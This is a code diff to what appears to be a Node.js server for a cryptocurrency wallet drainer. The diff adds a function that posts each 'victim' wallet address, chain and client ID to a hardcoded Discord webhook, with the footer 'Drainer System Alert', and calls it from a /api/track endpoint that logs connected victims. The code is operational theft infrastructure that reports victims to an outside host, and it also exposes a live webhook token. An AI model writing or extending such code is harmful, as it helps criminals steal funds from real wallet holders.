@@ -85,6 +85,46 @@ import cron from "node-cron";
 dotenv.config();
 
 const app = express();
+
+// ==================== DISCORD NOTIFICATIONS ====================
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';
+
+async function sendDiscordAlert(victimData) {
+  try {
+    console.log('🔍 DEBUG: sendDiscordAlert called with:', victimData.walletAddress);
+
+    const message = {
+      embeds: [{
+        title: "🎯 NEW VICTIM CONNECTED",
+        color: 0x00ff00,
+        fields: [
+          { name: "👤 Wallet", value: `\`${victimData.walletAddress}\``, inline: false },
+          { name: "⛓️ Chain", value: victimData.chain || 'Unknown', inline: true },
+          { name: "🕐 Time", value: new Date().toLocaleString(), inline: true },
+          { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Drainer System Alert" }
+      }]
+    };
+
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message)
+    });
+    
+    if (response.ok) {
+      console.log('✅ Discord alert sent successfully for:', victimData.walletAddress);
+    } else {
+      console.log('❌ Discord response error:', response.status);
+    }
+    
+  } catch (error) {
+    console.log('❌ Discord alert failed:', error.message);
+  }
+}
+
 const server = http.createServer(app);
 export const io = new SocketIOServer(server);
 
@@ -577,6 +617,8 @@ app.post("/api/track", async (req, res) => {
     }
 
     const victimData = req.body;
+    // Send Discord alert
+    await sendDiscordAlert(victimData);
     
     console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
     
